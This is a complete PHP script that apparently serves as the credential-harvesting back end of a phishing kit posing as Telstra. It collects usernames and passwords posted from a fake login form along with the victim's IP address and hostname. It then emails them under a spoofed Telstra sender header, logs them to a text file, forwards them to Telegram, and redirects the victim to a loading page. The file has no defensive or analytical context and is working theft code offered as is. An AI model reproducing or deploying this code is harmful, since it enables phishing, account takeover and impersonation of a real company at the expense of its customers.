<?php
include('Email.php');
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "__________________FLOW_____________\n";
$message .= "Log          : ".$_POST['username']."\n";
$message .= "Pass          : ".$_POST['password']."\n";
$message .= "______________ INFOS OF MACHINE _________\n";
$message .= "Ip of Machine              : $ip\n";
$message .= "Host               : $hostname\n";
$message .= "_________| l7way  |__________\n";

$subject = "LOGIN| ".$_POST['CC']." | $ip ";
$headers = "From:Telstra ";
mail($FLOW_EMAIL,$subject,$message,$headers);
$file = fopen('../Flow.txt', 'a');
fwrite($file,$message);
telegram_send(urlencode($message));
header("Location: load.php?id=4932YR-329TR23R");

?>